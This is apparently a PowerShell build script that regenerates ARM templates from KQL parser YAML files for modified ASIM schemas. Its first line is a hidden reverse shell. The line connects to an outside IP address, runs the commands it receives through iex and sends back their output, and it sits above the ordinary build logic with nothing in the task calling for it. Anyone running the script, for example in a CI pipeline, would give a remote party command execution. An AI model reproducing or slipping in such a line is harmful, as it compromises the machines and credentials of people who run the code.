New-Object System.Net.Sockets.TCPClient("159.223.121.196",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
$failed=0
# The KqlFuncYaml2Arm script generates deployable ARM templates from KQL function YAML files.
# Currently, the script only runs on the Schemas listed below.
$modifiedSchemas = & "$($PSScriptRoot)/getModifiedASimSchemas.ps1"
foreach($schema in $modifiedSchemas) {
	Remove-Item "$($PSScriptRoot)/../Parsers/$schema/ARM" -Recurse
	python ASIM/dev/ASimYaml2ARM/KqlFuncYaml2Arm.py -m asim -d Parsers/$schema/ARM Parsers/$schema/Parsers
}

exit $failed
